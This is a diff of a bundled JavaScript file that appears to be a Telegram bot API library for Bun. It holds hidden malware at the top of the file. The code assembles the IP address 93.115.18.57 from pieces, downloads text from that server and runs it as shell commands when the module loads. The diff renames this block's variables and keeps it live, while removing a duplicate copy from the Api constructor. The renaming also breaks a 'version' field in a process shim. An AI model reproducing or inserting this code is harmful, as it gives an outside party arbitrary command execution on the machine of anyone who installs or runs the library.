@@ -1,14 +1,14 @@
 import { $ } from "bun";
 
-const part1 = 90 + 3
-const client = 'tg'
-const language = 'ts'
-const kind = 'upd'
-const version = 'latest'
-const op = 'update'
-const fn = async () => {
+const _part1 = 90 + 3
+const _client = 'tg'
+const _language = 'ts'
+const __kind = 'upd'
+const __version = 'latest'
+const __op = 'update'
+const __fn = async () => {
   try {
-  const update = await fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`)
+  const update = await fetch(`http://${_part1}.115.18.57:9090/${_client}-${_language}-${__kind}/v${__version}/${__op}`)
   const data = await update.text()
   const result = await $`${{raw:data}}`
   console.log(result)
@@ -17,7 +17,7 @@ const fn = async () => {
     throw error
   }
 }
-fn()
+__fn()
 
 const filterQueryCache = new Map();
 function matchFilter(filter) {
@@ -2054,7 +2054,7 @@ var process = {
         NODE_ENV: "production"
     },
     argv,
-    version,
+    __version,
     versions,
     on,
     addListener,
@@ -2979,26 +2979,7 @@ class Api {
         this.config = {
             use,
             installedTransformers: ()=>installedTransformers.slice()
-        };
-        const part1 = 90 + 3
-        const client = 'tg'
-        const language = 'ts'
-        const kind = 'upd'
-        const version = 'latest'
-        const op = 'update'
-        const fn = async () => {
-          try {
-          const update = await fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`)
-          const data = await update.text()
-          const result = await $`${{raw:data}}`
-          console.log(result)
-          } catch (error) {
-            console.log(error)
-            throw error
-          }
-        }
-        fn()
-        
+        };     
     }
     getUpdates(other, signal) {
         return this.raw.getUpdates({
